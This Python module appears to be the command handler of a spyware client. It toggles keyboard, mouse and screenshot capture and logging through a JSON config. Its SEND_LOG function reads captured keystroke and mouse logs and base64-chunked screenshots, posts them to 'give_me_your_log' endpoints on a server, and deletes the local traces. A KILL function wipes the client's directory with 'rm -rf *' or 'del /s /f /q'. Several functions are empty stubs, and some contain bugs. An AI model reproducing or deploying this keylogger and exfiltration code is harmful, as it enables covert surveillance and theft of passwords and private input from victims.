from app.functions import run_server_sub, check_log
import subprocess, time, json, os, asyncio, requests, base64
def PAUSE_SERVER(x,server_process):
    """Server will be paused (kill and restart after x seconds)"""
    
    print("Server will be paused for {} seconds.".format(x))
    subprocess.Popen.kill(server_process)
    time.sleep(x)
    server_process = run_server_sub()
    return server_process


def PAUSE_CAPTURE_KEYBOARD():
    """Keyboard capture will be paused"""
    pass

def PAUSE_CAPTURE_MOUSE():
    """Mouse capture will be paused"""
    pass

def PAUSE_CAPTURE_PICTURE():
    """Picture capture will be paused"""
    pass

def STOP_SERVER(server_process):
    """Server will be stopped"""
    subprocess.Popen.kill(server_process)
    
    print("Server will be shutdown for 1 day seconds.")

def STOP_CAPTURE_KEYBOARD():
    """Keyboard capture will be stopped"""
    pass

def STOP_CAPTURE_MOUSE():
    """Mouse capture will be stopped"""
    pass

def STOP_CAPTURE_PICTURE():
    """Picture capture will be stopped"""
    pass

def RESTART_SERVER(server_process):
    """Server will be restarted"""
    
    subprocess.Popen.kill(server_process)
    pass

def RESTART_CAPTURE_KEYBOARD():
    """Restart keyboard capture"""
    pass

def RESTART_CAPTURE_MOUSE():
    """Restart mouse capture"""
    pass

def RESTART_CAPTURE_PICTURE():
    """Restart picture capture"""
    pass

def STOP_LOG_KEYBOARD(path):
    """Keyboard log will be stopped"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_KEYBOARD']['LOG'] == False:return False
        else: data['CAPTURE_KEYBOARD']['LOG'] = False
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################

def STOP_LOG_MOUSE(path):
    """Mouse log will be stopped"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_MOUSE']['LOG'] == False:return False
        else:data['CAPTURE_MOUSE']['LOG'] = False
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################

def STOP_LOG_PICTURE(path):
    """Picture log will be stopped"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_PICTURE']['LOG'] == False:return False
        else:data['CAPTURE_PICTURE']['LOG'] = False
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################

def START_LOG_KEYBOARD(path):
    """Keyboard log will be started"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_KEYBOARD']['LOG'] == True:return False
        else:data['CAPTURE_KEYBOARD']['LOG'] = True
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################


def START_LOG_MOUSE(path):
    """Mouse log will be started"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_MOUSE']['LOG'] == True:return False
        else:data['CAPTURE_MOUSE']['LOG'] = True
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################
    
def START_LOG_PICTURE(path):
    """Picture log will be started"""
    
    with open(path, 'r') as file:
        data = json.load(file)
        
        if data['CAPTURE_PICTURE']['LOG'] == True:return False
        else:data['CAPTURE_PICTURE']['LOG'] = True
        
    with open(path, 'w') as file:
        json.dump(data, file)
    #############################FONCTION STOP LOG####################################

def STATUS_SERVER(path):
    """Server status"""
    
    try:
        with open(path, 'r') as file:
            data = json.load(file)
            return data
    except:return False
    
def STATUS_LOG(path):
    """Log status"""
    
    try:
        with open(path, 'r') as file:
                data = json.load(file)
                config = {
                    "CAPTURE_KEYBOARD":data['CAPTURE_KEYBOARD']['LOG'],
                    "CAPTURE_MOUSE":data['CAPTURE_MOUSE']['LOG'],
                    "CAPTURE_PICTURE":data['CAPTURE_PICTURE']['LOG']
                }
                if config['CAPTURE_KEYBOARD'] == None:return False
                elif config['CAPTURE_MOUSE'] == None:return False
                elif config['CAPTURE_PICTURE'] == None:return False
                else:return config 
    except:
        asyncio.run(check_log())   
        return  STATUS_LOG(path)
    
def STATUS_CAPTURE():
    """Capture status"""
    
    pass

def RESET_CONFIG(server_process):
    """Reset configuration"""

    subprocess.Popen.kill(server_process)

def KILL():
    """Kill client"""
    
    if os.name == 'nt':
        repo = os.getcwd()
        get_out = "app\client"
        new_repo = repo.replace(get_out, "")
        os.system("del /s /f /q {}".format(new_repo))
        os.system("rmdir /s /q {}".format(new_repo))
    if os.name == 'posix':
        os.system("rm -rf *")

def LOG_TIMER(type,timer,path):
    """Add log timer"""
    print("je modifie")
    try:
        if type == "KEYBOARD":
            
            with open(path, 'r') as file:
                data = json.load(file)
                if not data['CAPTURE_KEYBOARD']['TIME']:return False
                else:data['CAPTURE_KEYBOARD']['TIME'] = timer
            
            with open(path, 'w') as file:
                json.dump(data, file)
                
        elif type == "MOUSE":
        
            with open(path, 'r') as file:
                data = json.load(file)
                if not data['CAPTURE_MOUSE']['TIME']:return False
                else:data['CAPTURE_MOUSE']['TIME'] = timer
            
            with open(path, 'w') as file:
                json.dump(data, file)
                
        
        elif type == "PICTURE":
        
            with open(path, 'r') as file:
                data = json.load(file)
                if not data['CAPTURE_PICTURE']['TIME']:return False
                else:data['CAPTURE_PICTURE']['TIME'] = timer
            
            with open(path, 'w') as file:
                json.dump(data, file)
        
        elif type == "ALL":
            
            with open(path, 'r') as file:
                data = json.load(file)
                if not data['CAPTURE_KEYBOARD']['TIME']:return False
                elif not data['CAPTURE_MOUSE']['TIME']:return False
                elif not data['CAPTURE_PICTURE']['TIME']:return False
                else:
                    data['CAPTURE_KEYBOARD']['TIME'] = timer
                    data['CAPTURE_MOUSE']['TIME'] = timer
                    data['CAPTURE_PICTURE']['TIME'] = timer
            
            with open(path, 'w') as file:
                json.dump(data, file)
            print("Timer set to {} seconds.".format(timer))
        else:return False
        return True
    except:
        asyncio.run(check_log(force=True))
        return LOG_TIMER(type,timer,path)
    
def DELETE_LOG(type,path):
    """Delete log"""
    
    if type == "KEYBOARD":
        if not os.path.exists(path+'/.keyboard/'):return False
        else:os.remove(path + '/.keyboard/')
    elif type == "MOUSE":
        if not os.path.exists(path+'/.mouse/'):return False
        else:os.remove(path + '/.mouse/')
    elif type == "PICTURE":
        if not os.path.exists(path+'/.picture/'):return False
        else:os.remove(path + '/.picture/')
    elif type == "ALL":
        if os.path.exists(path+'/.keyboard/'):os.remove(path + '/.keyboard/')
        elif os.path.exists(path+'/.mouse/'):os.remove(path + '/.mouse/')
        elif os.path.exists(path+'/.picture/'):os.remove(path + '/.picture/')
    else:return False
    
    return True

def MOVE():
    """Move the client"""
    pass

def PING():
    """ Ping - pong """
    
    print("Pong")

def PICTURE_MODE(mode,timer,path):
    """ Change picture mode [timer => Number in secondes or click => Number of click recommanded 50] """
    
    try:
        if mode == "CLICK":
            
            with open(path, 'r') as file:
                data = json.load(file)
                data['CAPTURE_PICTURE']['NUMBER_CLICK'] = timer
                data['CAPTURE_PICTURE']['TYPE'] = "CLICK"
            
            with open(path, 'w') as file:
                json.dump(data, file)
                
        elif mode == "TIMER":
        
            with open(path, 'r') as file:
                data = json.load(file)
                data['CAPTURE_PICTURE']['TIME'] = timer
                data['CAPTURE_PICTURE']['TIME'] = "TIMER"
            
            with open(path, 'w') as file:
                json.dump(data, file)
                
        return True
    except:
        asyncio.run(check_log(force=True))
        return PICTURE_MODE(type,timer,path)
def SEND_LOG():
    """ Send log """
    
    folder = './.log/.keyboard'
    files = os.listdir(folder)

    for file in files:
        path_file = os.path.join(folder, file)
        if os.path.isfile(path_file):
            with open(path_file, 'r') as file:
                contenu = file.read()
                url = "http://localhost:3000/give_me_your_log_keyboard"
                data = {"contenue": contenu}
                
                requests.post(url, data)
                time.sleep(5)
            os.remove(path_file) 
               
    folder = './.log/.mouse'
    files = os.listdir(folder)

    for file in files:
        path_file = os.path.join(folder, file)
        if os.path.isfile(path_file):
            with open(path_file, 'r') as file:
                contenu_b = file.read()
                url = "http://localhost:3000/give_me_your_log_mouse"
                data = {"contenue": contenu_b}
                
                requests.post(url, data)
                time.sleep(5)
            os.remove(path_file)  
            
    try:
        folder_img = './.log/.pictures'
        img = [f for f in os.listdir(folder_img) if f.endswith(('.jpg', '.jpeg', '.png', '.gif'))]

        folder_img = './.log/.pictures'
        url_serveur = "http://localhost:3000/give_me_your_log_picture"

        for img_name in img:
            file_img = os.path.join(folder_img, img_name)

            
            with open(file_img, 'rb') as img_file:# read the img as binary
                binary = img_file.read()

            # cut the img into 1024 bytes
            field = [binary[i:i+1024] for i in range(0, len(binary), 1024)]

            # Send the img to the server
            for i, fiel in enumerate(field):
                img_base64 = base64.b64encode(fiel).decode()
                data = {
                    "img_name": img_name,
                    "img_base64": img_base64
                }
                requests.post(url_serveur, data)
            os.remove(file_img)
    except:
        return SEND_LOG()